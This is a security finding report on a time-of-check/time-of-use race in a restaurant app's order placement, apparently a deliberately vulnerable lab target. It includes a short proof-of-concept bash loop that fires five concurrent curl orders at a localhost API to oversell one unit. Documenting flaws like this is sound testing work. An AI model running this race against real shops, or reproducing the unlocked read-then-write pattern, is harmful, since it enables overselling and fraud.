# H14 — TOCTOU Race Condition in Order Placement (F-A4)

**Severity:** High  
**CWE:** CWE-367 | **OWASP:** A04:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-024-f-a4-toctou-inventory.md`

## Summary

`PlaceOrder` reads `inventory.stock`, sleeps 175ms, then writes `stock - quantity`. No transaction, no row lock, no optimistic concurrency. Concurrent orders all see the same pre-decrement stock and oversell.

## PoC

```bash
# 5 concurrent orders for an item with stock=1
for i in 1 2 3 4 5; do
  (curl -X POST http://localhost:4443/api/orders \
    -H "Content-Type: application/json" \
    -H "Cookie: restaurant_session=<alice_session>" \
    -d '{"items":[{"menu_item_id":6,"quantity":1}],"note":""}') &
done
wait
# All 5 succeed. Inventory reads 0. 5 orders placed against 1 unit.
```

Requires `ENABLE_ADVANCED_VULNS=true` (to enable the inventory path).
